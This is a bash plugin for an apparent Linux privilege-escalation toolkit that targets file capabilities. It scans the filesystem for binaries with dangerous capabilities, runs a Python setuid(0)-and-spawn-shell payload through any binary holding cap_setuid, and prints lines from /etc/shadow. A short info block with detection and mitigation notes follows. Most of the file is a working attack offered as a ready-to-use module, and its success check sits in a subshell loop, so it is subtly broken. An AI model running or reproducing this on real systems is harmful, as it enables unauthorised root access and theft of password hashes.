#!/bin/bash
# Capabilities Exploit Plugin
PLUGIN_NAME="capabilities"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="N/A"
PLUGIN_DESCRIPTION="Linux Capabilities Privilege Escalation"

capabilities_detect() {
    log_message "Checking for exploitable capabilities..." "INFO"
    
    if ! command_exists getcap && ! command_exists getcap2; then
        log_message "getcap not available" "INFO"
        return 1
    fi
    
    local getcap_cmd="getcap"
    command_exists getcap || getcap_cmd="getcap2"
    
    local dangerous_caps="cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module|cap_sys_rawio|cap_setuid|cap_setgid|cap_chown|cap_fowner"
    
    local caps
    caps=$($getcap_cmd -r / 2>/dev/null | grep -E "$dangerous_caps" | head -5)
    
    if [ -n "$caps" ]; then
        log_message "Dangerous capabilities found" "WARNING"
        return 0
    fi
    
    log_message "No exploitable capabilities found" "INFO"
    return 1
}

capabilities_exploit() {
    log_message "Attempting capabilities exploitation..." "INFO"
    
    if ! capabilities_detect; then
        return 1
    fi
    
    local getcap_cmd="getcap"
    command_exists getcap || getcap_cmd="getcap2"
    
    # Find binaries with dangerous capabilities
    local caps
    caps=$($getcap_cmd -r / 2>/dev/null)
    
    # cap_setuid - can set UID to 0
    echo "$caps" | grep "cap_setuid" | while read -r line; do
        local binary
        binary=$(echo "$line" | awk '{print $1}')
        if [ -x "$binary" ]; then
            log_message "Trying cap_setuid on ${binary}..." "INFO"
            # Try to exploit
            "$binary" -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")' 2>/dev/null && {
                log_message "cap_setuid exploit SUCCESSFUL!" "SUCCESS"
                return 0
            }
        fi
    done
    
    # cap_sys_admin - equivalent to root
    echo "$caps" | grep "cap_sys_admin" | while read -r line; do
        local binary
        binary=$(echo "$line" | awk '{print $1}')
        log_message "cap_sys_admin on ${binary} - manual exploitation may be possible" "WARNING"
    done
    
    # cap_dac_read_search - can read any file
    echo "$caps" | grep "cap_dac_read_search" | while read -r line; do
        local binary
        binary=$(echo "$line" | awk '{print $1}')
        log_message "cap_dac_read_search on ${binary} - can read /etc/shadow" "WARNING"
        if [ -r "/etc/shadow" ]; then
            head -5 /etc/shadow 2>/dev/null
        fi
    done
    
    log_message "Capabilities exploitation completed" "INFO"
    return 1
}

capabilities_info() {
    cat << 'EOFINFO'
Linux Capabilities Exploitation
===============================
Linux capabilities provide fine-grained privileges to processes.
Dangerous capabilities include:
- cap_setuid: Can change UID to 0
- cap_sys_admin: Full administrative privileges
- cap_dac_read_search: Can read any file
- cap_sys_ptrace: Can trace any process

Detection:
getcap -r / 2>/dev/null

Mitigation:
- Remove unnecessary capabilities
- Use capability dropping in containers
EOFINFO
}
